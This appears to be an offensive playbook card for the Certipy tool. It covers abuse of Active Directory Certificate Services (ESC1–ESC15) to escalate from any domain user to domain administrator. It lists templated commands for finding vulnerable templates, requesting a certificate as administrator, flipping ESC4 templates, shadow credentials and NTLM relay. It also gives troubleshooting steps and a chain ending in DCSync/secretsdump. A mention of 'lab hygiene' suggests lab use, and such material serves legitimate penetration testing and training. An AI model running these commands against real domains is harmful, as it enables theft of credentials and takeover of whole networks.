# Certipy (senior)

ADCS is often the shortest path that BloodHound under-reports on older collectors.

## When / not

Use for: `find -vulnerable`, ESC1–ESC15, shadow credentials, PKINIT auth to a TGT.
Do not use if `find` says no CA. Skip. Not every lab ships ADCS.

## ESC cheat (what you actually do)

| ESC | Condition | Move |
| --- | --- | --- |
| 1 | enrollee supplies SAN, auth EKUs | `req -upn administrator@{{DOMAIN}}` |
| 2/3 | any-purpose / enrollment agent | request agent cert, then on-behalf-of |
| 4 | write on the template | `template -save-old` → turn into ESC1 → req → restore |
| 6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | SAN even if template forbids it |
| 8 | web enrollment + NTLM | ntlmrelayx `--adcs` (`relay.md`) |
| 9 | `StrongCertificateBindingEnforcement` = 0/1 + GenericWrite on user | shadow-like: request a cert for them |
| 10 | weak mapping + UPN/SAN tricks | same family as 9; check registry via CA |
| 11 | NTLM relay to ICPR (`certsvc_dcom`) | `ntlmrelayx -t rpc://CA` / `certipy relay` |
| 13 | group-linked template (OID) | enroll if you can join the linked group |
| 15 | `EDITF_ATTRIBUTESUBJECTALTNAME2` on a **version 1** template | ESC1-shaped req |

## Flags that matter

```
certipy find -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -dc-ip {{DC}} -vulnerable -stdout
certipy find -u {{USER}}@{{DOMAIN}} -hashes :{{HASH}} -dc-ip {{DC}} -vulnerable -stdout

# ESC1
certipy req -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -dc-ip {{DC}} \
  -ca CA-NAME -template ESC1 -upn administrator@{{DOMAIN}}
certipy auth -pfx administrator.pfx -dc-ip {{DC}}

# ESC4
certipy template -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -template ESC4 -save-old
# then req as ESC1; then template restore

# shadow
certipy shadow auto -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' -account TARGET -dc-ip {{DC}}
```

`-vulnerable` filters. Raw `find` without it is for when the filter misses ESC4/ESC8.

## Read this

- `Template Name`, `CA Name`, `Enrollee Supplies Subject`, `Client Authentication` — those four decide ESC1.
- `Permissions` / `Write Owner` / `Write DACL` on the template → ESC4, even if SAN is off.
- Web Enrollment `http://ca.{{DOMAIN}}/certsrv/` + NTLM → ESC8, no template write needed.
- `auth -pfx` prints an NT hash + saves a ccache. That hash is PTH to DCSync.

## Fail → next

| Symptom | Next |
| --- | --- |
| no CAs | skip this card |
| 401 on certsrv | need a user in the enrollment group, or relay |
| `CERTSRV_E_ENROLL_DENIED` | wrong template / not in enroll group |
| `KDC_ERR_PADATA_TYPE_NOSUPP` | PKINIT off. Use the NT hash Certipy printed, not the TGT |
| clock skew on auth | ntpdate, retry `auth -pfx` |
| ESC4 restore failed | you still have the `-save-old` json — put the template back (lab hygiene) |

## Chain

any user → find -vulnerable → (ESC1 req \| ESC4 flip \| ESC8 relay) → `auth -pfx` → secretsdump.
Shadow when BH says GenericWrite on a *user* and ADCS is noisy/off.
